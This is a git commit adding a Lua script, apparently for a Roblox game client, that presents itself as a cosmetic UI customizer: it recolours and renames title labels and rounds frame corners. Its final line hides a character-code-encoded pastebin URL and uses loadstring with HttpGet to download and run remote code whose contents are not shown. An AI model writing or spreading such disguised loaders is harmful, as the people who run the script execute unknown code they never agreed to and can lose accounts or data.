ff556648ce98035a4e1f12956d007d5478d784e4
nonamemansd <107858894+nonamemansd@users.noreply.github.com>
2026-01-30 09:39:34 +0200

    Upload Payload_75b6f9e5.lua

---
+++ Payload_75b6f9e5.lua
@@ -0,0 +1,39 @@
+
+--[[ STAGE 2: VISUAL CORE ]]
+local HubName = "Universal"
+local Acc = Color3.fromRGB(0, 255, 120)
+
+-- // SMART HOOK //
+local function Hook()
+    local function Customize(obj)
+        pcall(function()
+            -- 1. ЗАГОЛОВКИ (Smart Filter)
+            if obj:IsA("TextLabel") then
+                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
+                    if #obj.Text > 3 and not tonumber(obj.Text) then
+                        obj.Text = HubName
+                        obj.TextColor3 = Acc
+                    end
+                end
+            end
+            
+            -- 2. СКРУГЛЕНИЯ (Modern UI)
+            if obj:IsA("Frame") or obj:IsA("TextButton") then
+                if obj.BackgroundColor3.R < 0.2 then
+                    if not obj:FindFirstChild("UICorner") then
+                        local uic = Instance.new("UICorner")
+                        uic.CornerRadius = UDim.new(0, 6)
+                        uic.Parent = obj
+                    end
+                end
+            end
+        end)
+    end
+    
+    game.DescendantAdded:Connect(function(c)
+        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
+    end)
+end
+
+Hook()
+loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 88, 106, 69, 55, 103, 86, 98, 88)))()
